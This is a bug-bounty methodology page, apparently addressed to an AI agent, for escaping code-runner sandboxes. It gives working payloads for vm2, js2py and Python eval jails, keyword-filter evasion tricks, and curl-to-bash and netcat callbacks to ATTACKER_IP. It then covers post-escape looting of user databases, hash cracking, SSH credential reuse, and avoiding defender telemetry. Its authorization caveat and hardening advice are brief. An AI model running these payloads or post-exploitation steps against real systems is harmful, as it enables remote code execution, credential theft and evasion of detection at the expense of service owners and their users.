---
technology: "Online code runners / sandbox escapes"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
source: "corpus-grounded (command-context gate, internal coverage ledger) + upstream-verified: CVE-2023-30547 (vm2, NVD/Snyk, fix 3.9.17), CVE-2024-28397 (js2py <=0.74, NVD + Marven11 PoC, no fix), CVE-2023-0297 (pyLoad js2py pre-auth, huntr/Metasploit pyload_js2py_exec, fix 0.5.0b3.dev31), vm2 deprecation notice (escape history CVE-2023-37466/-37903 as context), CPython object-model semantics, 2026-11-12"
provenance: "corpus-grounded: 6 contributing writeups (internal coverage ledger, gate documented in header); upstream CVEs verified against primary sources during enrichment; basis of this page summarized from the unit ledger"
---

Companion page: [[code-runner|code runners overview]] — what this app class is and where you will meet it. Tool notes live in the tools vault; Appendix A names tools in prose.

# Code-runner / sandbox-escape bug bounty methodology

**Scope:** web apps and services whose feature is executing submitted code (editors, playgrounds, eval APIs), plus products that embed a JS sandbox for their own logic (downloaders, scrapers). **Out of scope:** template engines reached through SSTI (a template engine is not a runner — its payload family overlaps but the surface belongs to the web-framework units), and file-format deserialization (pickle/model loading — see [[ml-models|the model-format unit]]).

**Authorization:** code-execution testing on a runner is high-impact by design — the target's core feature executes your input, so stay inside the granted scope, prefer benign proof commands (`id`, a UUID-echo callback), and treat reverse shells as end-of-chain evidence only.

## Decision tree (one screen)

1. Editor/run endpoint found → Phase 1 (fingerprint the vehicle: which process evaluates, what library, what version).
2. Library named or inferable → Phase 3 with the matching payload family (vm2 / js2py / Python eval).
3. No sandbox claimed, code just runs → the finding is "unauthenticated RCE by design"; document impact of the *context* (whose credentials, what files), not the execution.
4. Keywords rejected with an error → Phase 4 (filter evasion) before concluding anything.
5. Escape confirmed → Phase 5 (stabilize, then loot the app context — instance DBs with user tables are the standard lateral step in the corpus).

## Phase 1 — Fingerprint the runner

- Read everything the app volunteers: About/limitations pages name the sandbox ("powered by vm2", restricted-module lists); a DOWNLOAD APP button or exposed source bundle yields `requirements.txt` / `package.json` — the js2py chain in the corpus was solved by a pinned `js2py==0.74` line before any payload ran.
- Probe the run surface: POST shape (`{"code": ...}` to `/run_code` or similar), sync vs async, whether stdout/stderr/errors return to the page.
- Time-and-error triage: `eval`-shaped errors (`NameError: name 'os' is not defined`) mean a Python jail; JS that accepts Python dunders means a translator (js2py); `require`/`process` blocked in otherwise-working Node means a sandbox library.

## Phase 2 — Confirm execution and output behavior

```js
// JS runners: distinguish sandbox presence
try { process } catch (e) { /* blocked: sandbox present */ }
new Error().stack          // vm2: stack reaches host frames in vulnerable versions
```

- If output is swallowed (corpus pattern: payload runs, page shows nothing), switch immediately to out-of-band: a DNS lookup or HTTP callback with a run-unique token, or `... | nc ATTACKER_IP 9001` to exfiltrate `whoami`.
- Record which user executes (the app user, e.g. a service account) — that is the blast radius statement for the report.

## Phase 3 — The three payload families

### 3a. vm2 (Node.js sandbox) — CVE-2023-30547

Affected: vm2 up to and including 3.9.16; patched in 3.9.17 (upstream: NVD/Snyk; no workaround was offered). Mechanism: an exception raised through a Proxy trap bypasses sanitization inside `handleException()`, and the host exception object leaks constructors that reach the Node process.

```js
err = {};
const handler = {
  getPrototypeOf(target) {
    (function stack() { new Error().stack; stack(); })();
  }
};
const proxiedErr = new Proxy(err, handler);
try { throw proxiedErr; }
catch ({constructor: c}) {
  c.constructor('return process')().mainModule.require('child_process')
    .execSync('curl http://ATTACKER_IP:8081/rev.sh | bash');   // corpus delivery: fetch + execute
}
```

Context: vm2's history is a chain of escapes and the library is deprecated (maintainer advice: stop using it) — a runner on vm2 at any version warrants a CVE sweep (upstream also records CVE-2023-37466 and CVE-2023-37903), not just this one.

### 3b. js2py (JS evaluated inside Python) — CVE-2024-28397

Affected: js2py up to 0.74 (latest); `disable_pyimport()` is bypassable and no upstream fix exists (upstream: NVD; PoC by Marven11). Mechanism: JS object introspection reaches the underlying Python objects, then walks the class hierarchy to `subprocess.Popen` — the escape runs *Python*, not just JS.

```js
// walk: object -> getattribute -> class/base -> subclasses -> subprocess.Popen
hacked = Object.getOwnPropertyNames({});
n11 = hacked.__getattribute__("__getattribute__");
obj = n11("__class__").__base__;
// recurse __subclasses__() for __module__=="subprocess" && __name__=="Popen",
// then: Popen(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
```

Corpus variant: the *same library* embedded in a product — pyLoad evaluated remote scripts through js2py, giving an unauthenticated pre-auth RCE via a crafted POST to its `flash/addcrypted2` endpoint (upstream: CVE-2023-0297, patched 0.5.0b3.dev31; Metasploit ships `pyload_js2py_exec`). When you meet js2py in the wild, it is usually somebody's dependency, not their feature.

### 3c. Stripped-builtin Python eval ("calculator jail")

The app calls `eval(expr, {'__builtins__': None})` and believes namespace reduction equals safety. The escape is pure object model — no import, no builtins needed:

```python
# 1) any literal -> class hierarchy
[()].__class__.__base__.__subclasses__()          # enumerate loaded classes
# 2) index-walk to os (corpus: __getitem__(117) reaching os.system)
[()].__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__['system']('whoami')
# 3) filter-safe variant: find Quitter, take sys.modules, fetch os.system,
#    defeating keyword bans with concatenation ('sy'+'s', 'o'+'s')
[w for w in 1 .__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0] \
  .__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('id')
```

Why `Quitter`: it is the class behind the interpreter's `exit`/`quit` objects, and it lives in a module whose globals import `sys` — so its `__init__.__globals__` hands you `sys`, and `sys.modules` hands you every loaded module, `os` included. Any console-adjacent class works as this trampoline; the corpus chain confirms the pattern end-to-end: enumerate subclasses, pick a class whose `__globals__` holds `sys`, pull `os` from `sys.modules`, call `os.system` with concatenated names.

## Phase 4 — Filter evasion rules (the runner's own control)

- **String building:** concatenation (`'o'+'s'`), `chr()` composition, base64-decoded `exec` bodies — defeats literal matchers.
- **Indirect reach:** never write the banned name; find a module object that already holds it (`sys.modules`, any class's `__globals__`) and attribute-walk to the callable.
- **Tokenizer tricks:** newlines/`exec("""\n...""")` bodies, comments to split tokens — the corpus jail chain ships payloads as base64 one-liners to dodge bad-character lists entirely.
- **Proxy/trampoline objects:** `__getattr__`, `__getattribute__`, `__getitem__` chains hide every target name from a scanner.
- Validate evasion separately from execution: prove the *filter* was bypassed (payload accepted) and the *sandbox* was bypassed (host command ran) as two distinct evidence artifacts.

## Phase 5 — Post-escape: the app context is the real target

Corpus-proven lateral steps from a runner shell:

- The Flask/Express instance directory (`app/instance`, `~/app`) holds a SQLite database (`users.db`, `database.db`, `tickets.db`) with app user tables — MD5 or bcrypt password hashes, crackable (hashcat modes 0 / 3200, rockyou-class lists) and reused on SSH for real system users.
- Environment and source review: the run endpoint's handler code names its dependencies (version pins), and the app's own users (dev/staging accounts) seed a credential-reuse pass.
- Expect the service account (`svc`, `app`, `app-production`-style names) to own nothing else; privilege escalation from there is generic Linux surface, out of this unit's scope.

## Phase 6 — Defense and validation notes

- **Finding shape:** library + version evidence (About page, requirements.txt, package.json), the payload that crossed the boundary, an out-of-band or command-output artifact, and the executing user — not just "code ran" (running code is the product).
- **Defender telemetry to note and avoid:** unusual eval-worker CPU, error-rate spikes from payload fuzzing, outbound callbacks from the eval process.
- **Hardening for the report:** sandboxes are not security boundaries at these libraries — isolate at the process/container level (separate user, no network, rlimits), pin patched versions where a patch exists (vm2 3.9.17; pyLoad 0.5.0b3.dev31), and replace js2py/vm2-class libraries entirely; filters should be capability controls (allowlists), never keyword blocklists.

## Appendix A — Tooling (named in prose)

- **hashcat** — mode 0 (MD5) and mode 3200 (bcrypt) for the post-escape app-database hashes.
- **sqlite3** — reading the runner's instance/user tables once on the host.
- **nc (netcat)** and a plain **python3 -m http.server** — out-of-band confirmation and payload delivery (the corpus delivery pattern is curl-piped-to-bash).
- **Metasploit module pyload_js2py_exec** — reference implementation of the pyLoad/js2py pre-auth chain (upstream-maintained; use for understanding, not spraying).
- References (upstream-verified for this page): NVD/Snyk records for CVE-2023-30547, CVE-2024-28397, CVE-2023-0297; the Marven11 js2py PoC repository; the vm2 deprecation notice.

## Appendix B — Quick reference

```bash
# fingerprint: read what the app tells you, then probe the run endpoint
#   POST /run_code {"code": "new Error().stack"}        -> vm2-shaped? host frames?
#   NameError on 'os' with working literals             -> Python eval jail
# payloads: Phase 3 (vm2 proxy-exception / js2py Popen-walk / subclasses-walk)
# confirmation: curl http://ATTACKER_IP:8081/rev.sh | bash   with nc -lnvp listening
# lateral: sqlite3 <app>/instance/*.db ; hashcat -m 0 hashes rockyou.txt
```
